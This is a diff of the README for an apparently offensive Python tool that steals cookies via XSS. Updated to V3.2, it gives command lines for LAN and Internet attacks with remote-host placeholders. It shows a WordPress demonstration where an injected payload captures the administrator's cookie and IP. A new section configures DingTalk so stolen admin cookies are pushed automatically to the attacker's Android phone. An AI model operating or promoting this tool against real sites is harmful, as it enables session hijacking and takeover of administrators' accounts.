@@ -1,23 +1,22 @@
 # XSS steals cookies
-* The current version v3.0 is simpler and faster
-* Obtain the victim's Internet IP address
+* The current version V3.2 updates the remote push of nails, so that you can receive victim information in real time on Android without having to face the host
 * Python version 3.6 or above
-* Automatically steal cookies
+* Obtain the victim's public IP address and cookie
 * Compatible with Windows or Linux
 ## usage method
   * View help information
 
-      ```#python3 XSS_Tool_V3.0.py -h```
+      ```#python3 XSS_Tool_V3.2.py -h```
 
-  ![图片名称](./Demo_image/Help.png "Help")  
+  ![图片名称](./Demo_image/Help2.png "Help")  
 
   * LAN attack
 
-      ```#python3 XSS_Tool_V3.0.py -lp (Local port)```
+      ```#python3 XSS_Tool_V3.2.py -lp (Local port)```
 
   * Internet attack
 
-      ```#python3 XSS_Tool_V3.0.py -t -lp (Local port) -rh (Remote host IP) -rp (Remote host port)```
+      ```#python3 XSS_Tool_V3.2.py -t -lp (Local port) -rh (Remote host IP) -rp (Remote host port)```
 
 ## Effect demonstration 
  * We will use WordPress-6.1.1 for XSS attack simulation test
@@ -31,18 +30,18 @@
 
 * Use Extranet attack
 
-    ```#python3 XSS_Tool_V3.0.py -t -lp 8080 -rh ***.***.***.*** -rp 10029```
+    ```#python3 XSS_Tool_V3.2.py -t -rh http://xxx.xxx.xxx -rp 10029```
 
-    ![图片名称](./Demo_image/Internet.png "Extranetattack")  
+    ![图片名称](./Demo_image/Internet1.png "Extranetattack")  
 
 
-# Use Intranet attack [Now Test]
+# Use Intranet attack [Do not push messages Test]
 -----------------Hacker--------------------------
 * You can use the - lp parameter to specify the port. If you do not write, the default port is 8888
 
-```#python3 XSS_Tool_V3.0.py```
+```#python3 XSS_Tool_V3.2.py```
 
-![图片名称](./Demo_image/Runing.png "Run")  
+![图片名称](./Demo_image/Runing2.png "Run")  
 
 * Copy payload and inject XXS injection point
 
@@ -61,4 +60,38 @@
 -----------------Hacker--------------------------
 * Hacker gets the administrator's cookie
 
-![图片名称](./Demo_image/Hack_Get_Cookie.png "Hack_Get_Cookie")
+![图片名称](./Demo_image/Hack_Get_Cookie3.png "Hack_Get_Cookie")
+
+# Use Intranet attack[Message push]
+* @1.Use the parameter options - dt and - dk for push settings
+
+```#python3 XSS_Tool_V3.2.py -dt xxxxx... -dk xxx```
+
+![图片名称](./Demo_image/HackDT.png "Run")  
+
+* @2.Or directly use the parameter dcf, provided that you have configured the parameters in the DingTalk.conf file
+
+
+1.You must modify the parameters in the DingTalk.conf file to use the - dcf option
+
+![图片名称](./Demo_image/DingTalk_Config.png "Run")  
+
+2.The - dcf option can be used after configuration
+
+```#python3 XSS_Tool_V3.2.py -dcf```
+
+![图片名称](./Demo_image/Config_OK.png "Run")  
+
+* Copy payload and inject XXS injection point
+
+
+
+----------Injection is the same as the above demonstration steps---------------
+
+* After the administrator cookie is obtained, it will be automatically pushed to the DingTalk platform
+
+![图片名称](./Demo_image/PUSH.png "Run")  
+
+* Android perspective
+
+![图片名称](./Demo_image/Android.jpg "Run")  
